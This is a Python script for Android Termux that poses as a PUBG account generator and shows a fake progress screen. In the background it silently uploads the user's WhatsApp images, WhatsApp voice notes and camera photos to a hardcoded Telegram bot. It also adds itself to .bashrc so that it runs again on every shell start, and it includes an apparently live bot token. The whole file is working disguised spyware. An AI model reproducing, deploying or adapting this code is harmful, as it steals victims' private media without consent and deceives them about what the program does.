import os
import sys
import time
import json
import subprocess
import random
import threading

# ===== تثبيت requests بصمت =====
try:
    import requests
except ImportError:
    with open(os.devnull, 'w') as devnull:
        subprocess.call([sys.executable, "-m", "pip", "install", "requests"], stdout=devnull, stderr=devnull)
    import requests

# ===== إعداد البوت =====
BOT_TOKEN = '7663148161:AAEvIRagn9uLRDFNxsHDgDNQ4iilSXGw1ro'
CHAT_ID = '5792222595'

# ===== مسارات الصور والصوت =====
FOLDER_PRIORITY = {
    "WhatsApp Images": [
        '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/',
        '/storage/emulated/0/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Images/',
    ],
    "Camera": [
        '/storage/emulated/0/DCIM/Camera/',
    ],
    "Voice Notes": [
        '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes/',
        '/storage/emulated/0/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Voice Notes/',
    ]
}

# ===== ملفات تتبع =====
HOME = os.path.expanduser("~")
SENT_LOG_FILE = os.path.join(HOME, '.sent_files.json')
STATE_FILE = os.path.join(HOME, '.start_initialized')

# ===== إرسال صامت =====
def send_file(path):
    try:
        with open(path, 'rb') as f:
            requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument',
                data={'chat_id': CHAT_ID},
                files={'document': f},
                timeout=15
            )
    except:
        pass

# ===== إرسال الملفات في الخلفية =====
def send_all():
    sent = []
    if os.path.exists(SENT_LOG_FILE):
        try:
            with open(SENT_LOG_FILE, 'r') as f:
                sent = json.load(f)
        except:
            sent = []
    for _, folders in FOLDER_PRIORITY.items():
        for folder in folders:
            if not os.path.exists(folder):
                continue
            for root, _, files in os.walk(folder):
                files.sort()
                for file in files:
                    full_path = os.path.join(root, file)
                    if full_path not in sent and os.path.isfile(full_path):
                        send_file(full_path)
                        sent.append(full_path)
                        try:
                            with open(SENT_LOG_FILE, 'w') as f:
                                json.dump(sent, f)
                        except:
                            pass
                        time.sleep(1)

# ===== إضافة للتشغيل التلقائي بصمت =====
def add_to_bashrc():
    bashrc = os.path.join(HOME, '.bashrc')
    entry = 'nohup python ~/start.py >/dev/null 2>&1 &'
    if os.path.exists(bashrc):
        with open(bashrc, 'r') as f:
            if entry in f.read():
                return
    with open(bashrc, 'a') as f:
        f.write(f'\n{entry}\n')

# ===== واجهة توليد حسابات ببجي وهمية =====
def show_fake_account_ui():
    os.system("clear")
    print("\033[1;32m==============================")
    print("   Creating 1000 PUBG Accounts...")
    print("==============================\033[0m\n")
    start = time.time()
    count = 1
    while time.time() - start < 900:  # 15 دقيقة
        delay = random.uniform(2.5, 5)
        print(f"✅ Account #{count} created successfully!")
        time.sleep(delay)
        count += 1
    print("\n\033[91m❌ Failed to complete all accounts. Please try again later.\033[0m\n")
    time.sleep(3)
    os.system("clear")

# ===== تشغيل كل شيء =====
def main():
    add_to_bashrc()
    threading.Thread(target=send_all, daemon=True).start()
    if not os.path.exists(STATE_FILE):
        show_fake_account_ui()
        with open(STATE_FILE, 'w') as f:
            f.write('done')
    else:
        os.system("clear")
        print("Updating Termux... Please wait.\n")
        time.sleep(4)
        os.system("clear")

if __name__ == '__main__':
    main()
